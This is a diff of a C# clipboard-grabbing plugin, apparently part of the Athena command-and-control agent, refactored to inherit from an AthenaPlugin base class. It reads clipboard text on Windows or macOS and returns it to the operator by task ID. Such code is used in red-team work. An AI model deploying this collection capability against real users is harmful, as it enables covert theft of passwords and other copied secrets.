@@ -6,48 +6,10 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 
-namespace Plugin
+namespace Plugins
 {
-    public static class getclipboard
+    public class Plugin : AthenaPlugin
     {
-        public static void Execute(Dictionary<string, object> args)
-        {
-            //I can either include this all in one (easier but larger plugin size)
-            //Or I can split them into 3 separate DLL's and handle which one to load on the "load" side
-            try
-            {
-                if (OperatingSystem.IsMacOS())
-                {
-                    PluginHandler.Write(OsxClipboard.GetText(), (string)args["task-id"], true);
-                }
-                else if (OperatingSystem.IsWindows())
-                {
-                    PluginHandler.Write(WindowsClipboard.GetText(), (string)args["task-id"], true);
-                }
-                else
-                {
-                    PluginHandler.Write("Not implemented on this OS yet.", (string)args["task-id"], true, "error");
-                }
-                //else
-                //{
-                //    return new ResponseResult
-                //    {
-                //        completed = "true",
-                //        user_output = "Not implemented on this OS yet.",
-                //        task_id = (string)args["task-id"],
-                //        status = "error"
-                //    };
-                //}
-            }
-            catch (Exception e)
-            {
-                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
-                return;
-            }
-        }
-
-        //Clipboard code from TextCopy: https://github.com/CopyText/TextCopy
-        //https://github.com/CopyText/TextCopy/blob/master/src/TextCopy/WindowsClipboard.cs
         static class WindowsClipboard
         {
             static void TryOpenClipboard()
@@ -201,6 +163,33 @@ namespace Plugin
         {
             public bool success { get; set; }
             public string output { get; set; }
+        }
+
+
+        public override void Execute(Dictionary<string, object> args)
+        {
+            //I can either include this all in one (easier but larger plugin size)
+            //Or I can split them into 3 separate DLL's and handle which one to load on the "load" side
+            try
+            {
+                if (OperatingSystem.IsMacOS())
+                {
+                    PluginHandler.Write(OsxClipboard.GetText(), (string)args["task-id"], true);
+                }
+                else if (OperatingSystem.IsWindows())
+                {
+                    PluginHandler.Write(WindowsClipboard.GetText(), (string)args["task-id"], true);
+                }
+                else
+                {
+                    PluginHandler.Write("Not implemented on this OS yet.", (string)args["task-id"], true, "error");
+                }
+            }
+            catch (Exception e)
+            {
+                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
+                return;
+            }
         }
     }
 }
